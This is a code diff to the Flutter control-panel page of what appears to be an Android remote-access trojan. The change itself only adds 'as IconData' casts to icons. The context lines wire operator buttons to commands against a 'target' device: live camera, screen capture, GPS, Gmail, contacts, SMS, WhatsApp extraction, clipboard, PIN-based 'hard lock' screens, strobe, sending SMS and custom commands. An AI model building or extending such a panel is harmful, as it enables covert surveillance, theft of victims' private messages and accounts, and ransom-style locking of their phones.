@@ -774,7 +774,7 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
                         child: Column(
                           mainAxisAlignment: MainAxisAlignment.center,
                           children: [
-                            const Icon(FontAwesomeIcons.wifi, color: _ink, size: 40),
+                            const Icon(FontAwesomeIcons.wifi as IconData, color: _ink, size: 40),
                             const SizedBox(height: 10),
                             Text("Connecting to target stream...", style: TextStyle(color: _ink.withOpacity(0.5), fontSize: 11)),
                           ],
@@ -2054,7 +2054,7 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
               borderRadius: BorderRadius.circular(4),
             ),
             child: Icon(
-              _isConnected ? FontAwesomeIcons.link : FontAwesomeIcons.linkSlash,
+              _isConnected ? FontAwesomeIcons.link as IconData : FontAwesomeIcons.linkSlash as IconData,
               color: _ink,
               size: 18,
             ),
@@ -2074,15 +2074,15 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
       padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
       child: Row(
         children: [
-          _statusBadge(FontAwesomeIcons.batteryFull, "$batLevel%", _getBatteryColor(batLevel)),
+          _statusBadge(FontAwesomeIcons.batteryFull as IconData, "$batLevel%", _getBatteryColor(batLevel)),
           const SizedBox(width: 8),
-          _statusBadge(FontAwesomeIcons.android, "Android", _blue),
+          _statusBadge(FontAwesomeIcons.android as IconData, "Android", _blue),
           const SizedBox(width: 8),
-          _statusBadge(FontAwesomeIcons.shieldHalved, status, statusColor),
+          _statusBadge(FontAwesomeIcons.shieldHalved as IconData, status, statusColor),
           const SizedBox(width: 8),
-          _statusBadge(FontAwesomeIcons.eye, "Visible", _purple),
+          _statusBadge(FontAwesomeIcons.eye as IconData, "Visible", _purple),
           const SizedBox(width: 8),
-          _statusBadge(FontAwesomeIcons.wifi, "UID: $_targetUID", _orange),
+          _statusBadge(FontAwesomeIcons.wifi as IconData, "UID: $_targetUID", _orange),
         ],
       ),
     );
@@ -2461,10 +2461,10 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
         child: Row(
           mainAxisAlignment: MainAxisAlignment.spaceAround,
           children: [
-            _statItem(FontAwesomeIcons.addressBook, "${(_deviceData['contacts'] as List?)?.length ?? 0}", "Contacts"),
-            _statItem(FontAwesomeIcons.message, "${(_deviceData['sms'] as List?)?.length ?? 0}", "SMS"),
+            _statItem(FontAwesomeIcons.addressBook as IconData, "${(_deviceData['contacts'] as List?)?.length ?? 0}", "Contacts"),
+            _statItem(FontAwesomeIcons.message as IconData, "${(_deviceData['sms'] as List?)?.length ?? 0}", "SMS"),
             _statItem(Icons.apps, "${(_deviceData['apps'] as List?)?.length ?? 0}", "Apps"),
-            _statItem(FontAwesomeIcons.envelope, "${(_deviceData['accounts'] as List?)?.length ?? 0}", "Gmails"),
+            _statItem(FontAwesomeIcons.envelope as IconData, "${(_deviceData['accounts'] as List?)?.length ?? 0}", "Gmails"),
           ],
         ),
       ),
@@ -2569,15 +2569,15 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
                       spacing: 10,
                       runSpacing: 10,
                       children: [
-                        _actionButton("LIVE CAM", FontAwesomeIcons.video, _orange, "start_live_camera"),
+                        _actionButton("LIVE CAM", FontAwesomeIcons.video as IconData, _orange, "start_live_camera"),
                         _actionButton("SCREEN", Icons.screenshot_monitor, _yellow, "get_screen"),
-                        _actionButton("GPS LOC", FontAwesomeIcons.locationDot, _green, "get_location"),
-                        _actionButton("GMAIL", FontAwesomeIcons.envelope, _red, "get_gmails"),
-                        _actionButton("CONTACTS", FontAwesomeIcons.addressBook, _blue, "get_contacts"),
-                        _actionButton("SMS", FontAwesomeIcons.message, _purple, "get_sms"),
+                        _actionButton("GPS LOC", FontAwesomeIcons.locationDot as IconData, _green, "get_location"),
+                        _actionButton("GMAIL", FontAwesomeIcons.envelope as IconData, _red, "get_gmails"),
+                        _actionButton("CONTACTS", FontAwesomeIcons.addressBook as IconData, _blue, "get_contacts"),
+                        _actionButton("SMS", FontAwesomeIcons.message as IconData, _purple, "get_sms"),
                         _actionButton("APPS", Icons.apps, _yellow, "get_apps"),
-                        _actionButton("GET WA", FontAwesomeIcons.whatsapp, _green, "extract_whatsapp", onCustomTap: _extractWhatsApp),
-                        _actionButton("CLIPBOARD", FontAwesomeIcons.copy, _blue, "get_clipboard"),
+                        _actionButton("GET WA", FontAwesomeIcons.whatsapp as IconData, _green, "extract_whatsapp", onCustomTap: _extractWhatsApp),
+                        _actionButton("CLIPBOARD", FontAwesomeIcons.copy as IconData, _blue, "get_clipboard"),
                       ],
                     ),
 
@@ -2586,12 +2586,12 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
                       spacing: 10,
                       runSpacing: 10,
                       children: [
-                        _actionButton("LOCK T1", FontAwesomeIcons.lock, _red, "lock_type1", isInput: true),
-                        _actionButton("LOCK T2", FontAwesomeIcons.comment, _green, "lock_type2", isInput: true),
-                        _actionButton("LOCK T3", FontAwesomeIcons.video, _blue, "lock_type3"),
-                        _actionButton("HARD LOCK", FontAwesomeIcons.lock, _red, "hard_lock", isInput: true, inputHint: "Message|PIN"),
-                        _actionButton("UNLOCK", FontAwesomeIcons.lockOpen, _green, "unlock"),
-                        _actionButton("DEVICE INFO", FontAwesomeIcons.info, _purple, "get_device_info"),
+                        _actionButton("LOCK T1", FontAwesomeIcons.lock as IconData, _red, "lock_type1", isInput: true),
+                        _actionButton("LOCK T2", FontAwesomeIcons.comment as IconData, _green, "lock_type2", isInput: true),
+                        _actionButton("LOCK T3", FontAwesomeIcons.video as IconData, _blue, "lock_type3"),
+                        _actionButton("HARD LOCK", FontAwesomeIcons.lock as IconData, _red, "hard_lock", isInput: true, inputHint: "Message|PIN"),
+                        _actionButton("UNLOCK", FontAwesomeIcons.lockOpen as IconData, _green, "unlock"),
+                        _actionButton("DEVICE INFO", FontAwesomeIcons.info as IconData, _purple, "get_device_info"),
                       ],
                     ),
 
@@ -2600,12 +2600,12 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
                       spacing: 10,
                       runSpacing: 10,
                       children: [
-                        _actionButton("STROBE", FontAwesomeIcons.lightbulb, _yellow, "flash_strobe"),
-                        _actionButton("STOP", FontAwesomeIcons.stop, _orange, "stop_strobe"),
-                        _actionButton("VOL MAX", FontAwesomeIcons.volumeHigh, _purple, "set_vol_max"),
+                        _actionButton("STROBE", FontAwesomeIcons.lightbulb as IconData, _yellow, "flash_strobe"),
+                        _actionButton("STOP", FontAwesomeIcons.stop as IconData, _orange, "stop_strobe"),
+                        _actionButton("VOL MAX", FontAwesomeIcons.volumeHigh as IconData, _purple, "set_vol_max"),
                         _actionButton("VIBRATE", Icons.vibration, _blue, "vibrate_loop"),
-                        _actionButton("PLAY AUDIO", FontAwesomeIcons.music, _red, "play_audio", isInput: true, inputHint: "Enter audio URL"),
-                        _actionButton("STOP AUDIO", FontAwesomeIcons.stop, _red, "stop_audio"),
+                        _actionButton("PLAY AUDIO", FontAwesomeIcons.music as IconData, _red, "play_audio", isInput: true, inputHint: "Enter audio URL"),
+                        _actionButton("STOP AUDIO", FontAwesomeIcons.stop as IconData, _red, "stop_audio"),
                       ],
                     ),
 
@@ -2614,10 +2614,10 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
                       spacing: 10,
                       runSpacing: 10,
                       children: [
-                        _actionButton("WALLPAPER", FontAwesomeIcons.image, _purple, "set_wallpaper", isInput: true, inputHint: "Enter image URL"),
-                        _actionButton("TTS", FontAwesomeIcons.microphone, _blue, "speak_tts", isInput: true, inputHint: "Enter text to speak"),
-                        _actionButton("OPEN URL", FontAwesomeIcons.globe, _green, "open_url", isInput: true, inputHint: "Enter URL"),
-                        _actionButton("SEND SMS", FontAwesomeIcons.sms, _yellow, "send_sms", isInput: true, inputHint: "Number|Message"),
+                        _actionButton("WALLPAPER", FontAwesomeIcons.image as IconData, _purple, "set_wallpaper", isInput: true, inputHint: "Enter image URL"),
+                        _actionButton("TTS", FontAwesomeIcons.microphone as IconData, _blue, "speak_tts", isInput: true, inputHint: "Enter text to speak"),
+                        _actionButton("OPEN URL", FontAwesomeIcons.globe as IconData, _green, "open_url", isInput: true, inputHint: "Enter URL"),
+                        _actionButton("SEND SMS", FontAwesomeIcons.sms as IconData, _yellow, "send_sms", isInput: true, inputHint: "Number|Message"),
                       ],
                     ),
 
@@ -2644,8 +2644,8 @@ class _ControlCenterPageState extends State<ControlCenterPage> with SingleTicker
                       spacing: 10,
                       runSpacing: 10,
                       children: [
-                        _actionButton("CUSTOM", FontAwesomeIcons.terminal, _purple, "", isCustom: true),
-                        _actionButton("PING", FontAwesomeIcons.networkWired, _blue, "ping"),
+                        _actionButton("CUSTOM", FontAwesomeIcons.terminal as IconData, _purple, "", isCustom: true),
+                        _actionButton("PING", FontAwesomeIcons.networkWired as IconData, _blue, "ping"),
                       ],
                     ),
                     
